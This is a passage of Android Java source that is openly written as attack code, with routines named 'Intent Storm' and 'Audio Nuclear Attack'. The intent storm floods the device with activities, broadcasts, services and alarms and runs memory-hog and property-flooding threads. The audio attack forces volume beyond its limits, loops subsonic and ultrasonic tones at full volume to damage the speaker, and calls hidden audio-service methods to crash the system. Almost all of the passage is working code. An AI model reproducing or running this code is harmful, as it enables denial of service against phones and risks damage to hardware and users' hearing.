                        while (isAttacking.get() && intentCount.get() < TARGET_INTENTS) {
                            try {
                                // Send a batch of intents
                                for (int i = 0; i < BATCH_SIZE; i++) {
                                    intentCount.incrementAndGet();

                                    // METHOD 1: Direct activity start
                                    android.content.Intent intent = new android.content.Intent(ctx, mainActivityClass);

                                    // Use ALL possible flags to maximize impact
                                    intent.setFlags(
                                            android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                                                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP |
                                                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK |
                                                    android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK |
                                                    android.content.Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
                                                    android.content.Intent.FLAG_ACTIVITY_LAUNCH_ADJACENT |
                                                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED |
                                                    android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION
                                    );

                                    // Add unique data to each intent
                                    intent.setData(android.net.Uri.parse(
                                            "storm://" + attackId + "/" + finalThreadId + "/" +
                                                    intentCount.get() + "/" + System.nanoTime()
                                    ));

                                    // Add excessive extras to bloat memory
                                    android.os.Bundle extras = new android.os.Bundle();
                                    for (int e = 0; e < 100; e++) {
                                        extras.putString("extra_key_" + e,
                                                java.util.UUID.randomUUID().toString().repeat(10));
                                    }
                                    intent.putExtras(extras);

                                    // Start activity using reflection
                                    try {
                                        Class<?> contextCls = Class.forName("android.content.Context");
                                        java.lang.reflect.Method startActivityMethod =
                                                contextCls.getMethod("startActivity", android.content.Intent.class);
                                        startActivityMethod.invoke(ctx, intent);
                                        successCount.incrementAndGet();
                                    } catch (Throwable t) {
                                        errorCount.incrementAndGet();
                                    }

                                    // METHOD 2: Start activity for result (if context is Activity)
                                    try {
                                        if (ctx instanceof android.app.Activity) {
                                            android.app.Activity activity = (android.app.Activity) ctx;
                                            Class<?> activityCls = Class.forName("android.app.Activity");
                                            java.lang.reflect.Method startForResultMethod = activityCls.getMethod(
                                                    "startActivityForResult",
                                                    android.content.Intent.class,
                                                    int.class
                                            );

                                            android.content.Intent intent2 = new android.content.Intent(ctx, mainActivityClass);
                                            intent2.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                                            intent2.putExtra("storm_attack", true);
                                            intent2.putExtra("thread", finalThreadId);
                                            intent2.putExtra("count", intentCount.get());

                                            startForResultMethod.invoke(activity, intent2, 999999 + (int)intentCount.get());
                                            successCount.incrementAndGet();
                                        }
                                    } catch (Throwable t) {
                                        errorCount.incrementAndGet();
                                    }

                                    // METHOD 3: Flood with broadcasts if enabled
                                    if (USE_BROADCASTS) {
                                        try {
                                            android.content.Intent broadcast = new android.content.Intent(
                                                    "com.reflect.intent.storm.ATTACK_" + attackId
                                            );
                                            broadcast.putExtra("storm_id", attackId);
                                            broadcast.putExtra("intent_number", intentCount.get());
                                            broadcast.putExtra("timestamp", System.currentTimeMillis());

                                            // Send broadcast via reflection
                                            Class<?> contextCls = Class.forName("android.content.Context");
                                            java.lang.reflect.Method sendBroadcastMethod =
                                                    contextCls.getMethod("sendBroadcast", android.content.Intent.class);
                                            sendBroadcastMethod.invoke(ctx, broadcast);
                                        } catch (Throwable t) {
                                            // Ignore broadcast errors
                                        }
                                    }

                                    // METHOD 4: Start services if enabled
                                    if (USE_SERVICES) {
                                        try {
                                            // Create a dummy service class name
                                            String serviceClassName = ctx.getPackageName() + ".DummyStormService";
                                            android.content.Intent serviceIntent = new android.content.Intent();
                                            serviceIntent.setClassName(ctx.getPackageName(), serviceClassName);
                                            serviceIntent.putExtra("storm_attack", true);

                                            // Try to start service via reflection
                                            if (android.os.Build.VERSION.SDK_INT >= 26) {
                                                // Use startForegroundService on newer APIs
                                                Class<?> contextCls = Class.forName("android.content.Context");
                                                java.lang.reflect.Method startForegroundServiceMethod =
                                                        contextCls.getMethod("startForegroundService", android.content.Intent.class);
                                                startForegroundServiceMethod.invoke(ctx, serviceIntent);
                                            } else {
                                                Class<?> contextCls = Class.forName("android.content.Context");
                                                java.lang.reflect.Method startServiceMethod =
                                                        contextCls.getMethod("startService", android.content.Intent.class);
                                                startServiceMethod.invoke(ctx, serviceIntent);
                                            }
                                        } catch (Throwable t) {
                                            // Ignore service errors
                                        }
                                    }

                                    // METHOD 5: Create pending intents if enabled
                                    if (USE_PENDING_INTENTS && intentCount.get() % 100 == 0) {
                                        try {
                                            Class<?> piCls = Class.forName("android.app.PendingIntent");

                                            android.content.Intent piIntent = new android.content.Intent(ctx, mainActivityClass);
                                            piIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                                            piIntent.putExtra("pending_storm", true);

                                            int flags = (int) piCls.getField("FLAG_UPDATE_CURRENT").get(null);

                                            // Create many pending intents to flood the system
                                            for (int pi = 0; pi < 10; pi++) {
                                                Object pendingIntent = piCls.getMethod(
                                                        "getActivity",
                                                        android.content.Context.class,
                                                        int.class,
                                                        android.content.Intent.class,
                                                        int.class
                                                ).invoke(null, ctx, 1000000 + (int)intentCount.get() + pi, piIntent, flags);

                                                // Try to send the pending intent
                                                try {
                                                    Class<?> amCls = Class.forName("android.app.AlarmManager");
                                                    Object am = ctx.getSystemService(android.content.Context.ALARM_SERVICE);
                                                    if (am != null && amCls.isInstance(am)) {
                                                        java.lang.reflect.Method setMethod = amCls.getMethod(
                                                                "set",
                                                                int.class,
                                                                long.class,
                                                                android.app.PendingIntent.class
                                                        );
                                                        int RTC_WAKEUP = amCls.getField("RTC_WAKEUP").getInt(null);
                                                        setMethod.invoke(am, RTC_WAKEUP,
                                                                System.currentTimeMillis() + 1000,
                                                                pendingIntent);
                                                    }
                                                } catch (Throwable t) {
                                                    // Ignore alarm manager errors
                                                }
                                            }
                                        } catch (Throwable t) {
                                            // Ignore pending intent errors
                                        }
                                    }
                                }

                                // Small random delay between batches
                                try {
                                    Thread.sleep((long)(Math.random() * DELAY_VARIANCE));
                                } catch (InterruptedException e) {
                                    break;
                                }

                            } catch (Throwable t) {
                                errorCount.incrementAndGet();
                                // Continue despite errors
                            }
                        }

                    } catch (Throwable t) {
                        android.util.Log.e(TAG, "Attack thread crashed: " + threadName, t);
                    }
                });

                attackThread.setName("IntentStorm-" + threadId);
                attackThread.setPriority(Thread.MAX_PRIORITY);
                attackThreads.add(attackThread);
            }

            // Start all attack threads
            for (Thread thread : attackThreads) {
                thread.start();
            }

            // Schedule attack termination after 60 seconds or when target is reached
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                isAttacking.set(false);
                alarmUi("-- ATTACK TERMINATED AFTER 60 SECONDS --");
                alarmUi("Final Count: " + intentCount.get() + " intents attempted");
                alarmUi("Device stability: UNKNOWN (may crash any moment)");
            }, 60000);

            // Create memory stressor thread
            new Thread(() -> {
                try {
                    // Allocate huge lists to stress memory
                    java.util.List<byte[]> memoryHog = new java.util.ArrayList<>();
                    while (isAttacking.get()) {
                        try {
                            // Allocate 100MB chunks
                            byte[] chunk = new byte[100 * 1024 * 1024];
                            // Fill with random data
                            new java.util.Random().nextBytes(chunk);
                            memoryHog.add(chunk);

                            // Keep last 500 chunks to avoid OOM too quickly
                            if (memoryHog.size() > 500) {
                                memoryHog.remove(0);
                            }

                            Thread.sleep(100);
                        } catch (Throwable t) {
                            // Memory allocation failed, continue
                        }
                    }
                } catch (Throwable t) {
                    // Memory thread crashed
                }
            }).start();

            // Start system property flooding
            new Thread(() -> {
                try {
                    while (isAttacking.get()) {
                        // Use reflection to set system properties (if possible)
                        try {
                            Class<?> systemClass = Class.forName("android.os.SystemProperties");
                            java.lang.reflect.Method setMethod = systemClass.getMethod(
                                    "set", String.class, String.class
                            );

                            // Set random properties
                            String key = "storm_" + attackId + "_" + System.nanoTime();
                            String value = java.util.UUID.randomUUID().toString();
                            setMethod.invoke(null, key, value);

                        } catch (Throwable t) {
                            // Reflection failed, ignore
                        }

                        Thread.sleep(10);
                    }
                } catch (Throwable t) {
                    // Property thread crashed
                }
            }).start();

            String startMsg = "-- INTENT STORM LAUNCHED --\n" +
                    "Attack ID: " + attackId + "\n" +
                    "Threads: " + THREAD_COUNT + "\n" +
                    "Target: " + TARGET_INTENTS + " intents";

            alarmUi(startMsg);
            android.util.Log.e(TAG, startMsg);

            return new Result("Intent Storm Attack (LAUNCHED)",
                    new java.util.ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e(TAG, "Failed to launch intent storm", t);
            alarmUi("Attack failed to launch: " + t.getMessage());
            return new Result("Intent Storm Attack (FAILED TO LAUNCH)",
                    new java.util.ArrayList<>(alarmUiRows));
        }
    }

    // Helper function to stop the attack if needed
    public void stopIntentStorm() {
        try {
            // This would need coordination with the attack threads
            // In practice, might need to kill the app process
            android.os.Process.killProcess(android.os.Process.myPid());
        } catch (Throwable t) {
            // Force stop
            System.exit(1);
        }
    }



// -------------------------------------------------------------------------------------------------------

    public Result executeAudioSystemAttack() {
        final String TAG = "AUDIO_NUKE";
        final String attackId = "AUDIO_NUKE_" + System.currentTimeMillis();

        try {
            android.content.Context ctx = getContextReflectively();
            if (ctx == null) {
                return new Result("Audio Nuclear Attack (failed: no context)", new ArrayList<>());
            }

            alarmUi("INITIATING AUDIO SYSTEM ATTACK");
            alarmUi("Attack ID: " + attackId);

            final int DURATION_SECONDS = 20; // How long to run the attack
            final int THREAD_COUNT = 10; // Multiple simultaneous attacks

            // Initialize counters and state
            final java.util.concurrent.atomic.AtomicBoolean isAttacking = new java.util.concurrent.atomic.AtomicBoolean(true);
            final java.util.concurrent.atomic.AtomicLong attackCount = new java.util.concurrent.atomic.AtomicLong(0);
            final java.util.concurrent.atomic.AtomicLong successCount = new java.util.concurrent.atomic.AtomicLong(0);
            final java.util.concurrent.atomic.AtomicLong errorCount = new java.util.concurrent.atomic.AtomicLong(0);

            // Start monitoring
            new Thread(() -> {
                while (isAttacking.get()) {
                    try {
                        Thread.sleep(1000);
                        long total = attackCount.get();

                        String stats = String.format(
                                "AUDIO ATTACK STATS\n" +
                                        "Attack: %s\n" +
                                        "Total Operations: %d\n" +
                                        "Successes: %d\n" +
                                        "Errors: %d\n" +
                                        "Active Threads: %d\n" +
                                        "Remaining: %d seconds",
                                attackId, total, successCount.get(), errorCount.get(),
                                THREAD_COUNT, DURATION_SECONDS - (attackCount.get()/100)
                        );

                        android.util.Log.e(TAG, stats);
                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                            alarmUi(stats);
                        });

                    } catch (Throwable t) {
                        // Ignore
                    }
                }
            }).start();

            // Get AudioManager via reflection
            Object audioManager = null;
            try {
                Class<?> audioManagerClass = Class.forName("android.media.AudioManager");
                java.lang.reflect.Method getSystemService = ctx.getClass().getMethod("getSystemService", String.class);
                audioManager = getSystemService.invoke(ctx, Context.AUDIO_SERVICE);

                if (audioManager == null || !audioManagerClass.isInstance(audioManager)) {
                    alarmUi("Failed to get AudioManager");
                    return new Result("Audio Attack (failed to get AudioManager)", new ArrayList<>());
                }

                alarmUi("Got AudioManager via reflection");

            } catch (Throwable t) {
                android.util.Log.e(TAG, "Failed to get AudioManager", t);
                alarmUi("Failed to get AudioManager: " + t.getMessage());
                return new Result("Audio Attack (failed)", new ArrayList<>());
            }

            // Start attack threads
            java.util.List<Thread> attackThreads = new java.util.ArrayList<>();

            for (int threadId = 0; threadId < THREAD_COUNT; threadId++) {
                Object finalAudioManager = audioManager;
                int finalThreadId = threadId;
                Thread attackThread = new Thread(() -> {
                    try {
                        while (isAttacking.get() && attackCount.get() < Long.MAX_VALUE) {
                            attackCount.incrementAndGet();

                            try {
                                //1
                                executeMaximumVolumeAttack(finalAudioManager, ctx, finalThreadId);
                                successCount.incrementAndGet();
                                //2
                                executeSpeakerDestructionAttack(finalAudioManager, ctx, finalThreadId);
                                //3
                                executeDirectAudioServiceAttack(ctx, finalThreadId);


                            } catch (Throwable t) {
                                errorCount.incrementAndGet();
                                // Continue attack despite errors
                            }

                            // No delay - maximum speed
                        }
                    } catch (Throwable t) {
                        android.util.Log.e(TAG, "Attack thread " + finalThreadId + " crashed", t);
                    }
                });

                attackThread.setName("AudioNuke-" + threadId);
                attackThread.setPriority(Thread.MAX_PRIORITY);
                attackThreads.add(attackThread);
            }

            // Start all attack threads
            for (Thread thread : attackThreads) {
                thread.start();
            }

            // Schedule termination
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                isAttacking.set(false);
                alarmUi("AUDIO ATTACK COMPLETED AFTER " + DURATION_SECONDS + " SECONDS");
                alarmUi("Total operations: " + attackCount.get());
            }, DURATION_SECONDS * 1000);

            return new Result("Audio System Attack",
                    new java.util.ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e(TAG, "Failed to launch audio attack", t);
            alarmUi("Attack failed to launch: " + t.getMessage());
            return new Result("Audio System Attack (FAILED TO LAUNCH)",
                    new java.util.ArrayList<>(alarmUiRows));
        }
    }

    // ATTACK 1: Maximum Volume Override
    private void executeMaximumVolumeAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
        Class<?> audioManagerClass = Class.forName("android.media.AudioManager");

        // Get all stream types via reflection
        java.lang.reflect.Field[] fields = audioManagerClass.getDeclaredFields();
        for (java.lang.reflect.Field field : fields) {
            if (field.getName().startsWith("STREAM_") && field.getType() == int.class) {
                try {
                    int streamType = field.getInt(null);

                    // Try to set volume to insane values
                    java.lang.reflect.Method setStreamVolume = audioManagerClass.getMethod(
                            "setStreamVolume",
                            int.class, int.class, int.class
                    );

                    // First, try to set to max volume
                    java.lang.reflect.Method getStreamMaxVolume = audioManagerClass.getMethod(
                            "getStreamMaxVolume",
                            int.class
                    );

                    int maxVolume = (int) getStreamMaxVolume.invoke(audioManager, streamType);

                    // Try to bypass limits by setting volume to absurd values
                    for (int attempt = maxVolume; attempt <= 1000; attempt += 100) {
                        try {
                            setStreamVolume.invoke(audioManager, streamType, attempt, 0);
                            android.util.Log.w("AUDIO_ATTACK",
                                    "Thread " + threadId + ": Set stream " + field.getName() +
                                            " to volume " + attempt);
                        } catch (Throwable t) {
                            // Expected to fail, but we try anyway
                        }
                    }

                    // Also try negative values
                    try {
                        setStreamVolume.invoke(audioManager, streamType, -1000, 0);
                    } catch (Throwable t) {
                        // Ignore
                    }

                    // Rapid volume adjustments
                    java.lang.reflect.Method adjustStreamVolume = audioManagerClass.getMethod(
                            "adjustStreamVolume",
                            int.class, int.class, int.class
                    );

                    // ADJUST_RAISE constant
                    int ADJUST_RAISE = audioManagerClass.getField("ADJUST_RAISE").getInt(null);
                    int ADJUST_LOWER = audioManagerClass.getField("ADJUST_LOWER").getInt(null);
                    int ADJUST_TOGGLE_MUTE = audioManagerClass.getField("ADJUST_TOGGLE_MUTE").getInt(null);

                    // Rapid raise/lower cycles
                    for (int i = 0; i < 100; i++) {
                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_RAISE, 0);
                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_LOWER, 0);
                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_TOGGLE_MUTE, 0);
                    }

                } catch (Throwable t) {
                    // Continue with next stream type
                }
            }
        }
    }

    // ATTACK 2: Speaker Attack via Tone Generation
    private void executeSpeakerDestructionAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
        // Try to generate destructive frequencies
        try {
            Class<?> audioTrackClass = Class.forName("android.media.AudioTrack");

            // Create audio track with maximum volume
            int STREAM_MUSIC = Class.forName("android.media.AudioManager")
                    .getField("STREAM_MUSIC").getInt(null);

            int SAMPLE_RATE = 44100;
            int CHANNEL_OUT_MONO = 4; // AudioFormat.CHANNEL_OUT_MONO
            int ENCODING_PCM_16BIT = 2; // AudioFormat.ENCODING_PCM_16BIT

            // Generate destructive sine waves
            int bufferSize = android.media.AudioTrack.getMinBufferSize(
                    SAMPLE_RATE, CHANNEL_OUT_MONO, ENCODING_PCM_16BIT);

            // Create multiple AudioTracks to overload system
            for (int trackNum = 0; trackNum < 10; trackNum++) {
                try {
                    // Generate destructive frequencies
                    double[] freqs = {5, 10, 20, 40, 20000, 21000}; // Subsonic to ultrasonic

                    for (double freq : freqs) {
                        // Generate 1 second of tone
                        short[] buffer = generateTone(freq, 1.0, SAMPLE_RATE);

                        java.lang.reflect.Constructor<?> constructor = audioTrackClass.getConstructor(
                                int.class, int.class, int.class, int.class, int.class, int.class
                        );

                        Object audioTrack = constructor.newInstance(
                                STREAM_MUSIC, SAMPLE_RATE, CHANNEL_OUT_MONO,
                                ENCODING_PCM_16BIT, buffer.length * 2, 1 // MODE_STATIC
                        );

                        // Write data
                        java.lang.reflect.Method writeMethod = audioTrackClass.getMethod(
                                "write", short[].class, int.class, int.class
                        );

                        writeMethod.invoke(audioTrack, buffer, 0, buffer.length);

                        // Set volume to maximum
                        java.lang.reflect.Method setVolumeMethod = audioTrackClass.getMethod(
                                "setVolume", float.class
                        );
                        setVolumeMethod.invoke(audioTrack, 1.0f);

                        // Play in loop
                        java.lang.reflect.Method setLoopPointsMethod = audioTrackClass.getMethod(
                                "setLoopPoints", int.class, int.class, int.class
                        );
                        setLoopPointsMethod.invoke(audioTrack, 0, buffer.length, -1); // Infinite loop

                        java.lang.reflect.Method playMethod = audioTrackClass.getMethod("play");
                        playMethod.invoke(audioTrack);

                        // Don't release - let it play forever
                    }

                } catch (Throwable t) {
                    // Continue with next track
                }
            }

        } catch (Throwable t) {
            // Fall back to other methods
        }
    }

    // Helper: Generate tone
    private short[] generateTone(double freq, double duration, int sampleRate) {
        int numSamples = (int)(duration * sampleRate);
        short[] buffer = new short[numSamples];

        for (int i = 0; i < numSamples; i++) {
            double sample = Math.sin(2 * Math.PI * i * freq / sampleRate);
            buffer[i] = (short)(sample * Short.MAX_VALUE);
        }

        return buffer;
    }


    // ATTACK 3: AudioService Attack - Causes dead system on emulator
    private void executeDirectAudioServiceAttack(android.content.Context ctx, int threadId) throws Exception {
        try {
            // Get IAudioService via ServiceManager
            Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
            java.lang.reflect.Method getService = serviceManagerClass.getMethod(
                    "getService", String.class
            );

            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, Context.AUDIO_SERVICE);

            if (binder != null) {
                // Get IAudioService interface
                Class<?> iAudioServiceStub = Class.forName("android.media.IAudioService$Stub");
                java.lang.reflect.Method asInterface = iAudioServiceStub.getMethod(
                        "asInterface", android.os.IBinder.class
                );

                Object audioService = asInterface.invoke(null, binder);

                if (audioService != null) {
                    Class<?> iAudioServiceClass = Class.forName("android.media.IAudioService");

                    // Call dangerous methods directly
                    try {
                        java.lang.reflect.Method adjustStreamVolume = iAudioServiceClass.getMethod(
                                "adjustStreamVolume", int.class, int.class, int.class, String.class, String.class
                        );

                        // Flood with volume adjustments
                        for (int i = 0; i < 1000; i++) {
                            for (int stream = 0; stream < 10; stream++) {
                                try {
                                    adjustStreamVolume.invoke(audioService, stream, 1, 0,
                                            ctx.getPackageName(), null);
                                    adjustStreamVolume.invoke(audioService, stream, -1, 0,
                                            ctx.getPackageName(), null);
                                } catch (Throwable t) {
                                    // Ignore
                                }
                            }
                        }

                    } catch (Throwable t) {
                        // Method signature might be different
                    }

                    // Try to call other dangerous methods
                    java.lang.reflect.Method[] methods = iAudioServiceClass.getMethods();
                    for (java.lang.reflect.Method method : methods) {
                        if (method.getName().contains("set") || method.getName().contains("adjust")) {
                            try {
                                // Call with dummy parameters
                                java.lang.Class<?>[] paramTypes = method.getParameterTypes();
                                Object[] params = new Object[paramTypes.length];

                                // Fill with default values
                                for (int i = 0; i < params.length; i++) {
                                    if (paramTypes[i] == int.class) {
                                        params[i] = 0;
                                    } else if (paramTypes[i] == String.class) {
                                        params[i] = ctx.getPackageName();
                                    } else if (paramTypes[i] == boolean.class) {
                                        params[i] = true;
                                    } else {
                                        params[i] = null;
                                    }
                                }

                                // Call the method
                                method.invoke(audioService, params);

                            } catch (Throwable t) {
                                // Ignore failures
                            }
                        }
                    }
                }
            }
        } catch (Throwable t) {
            // ServiceManager access might fail
        }
    }

}
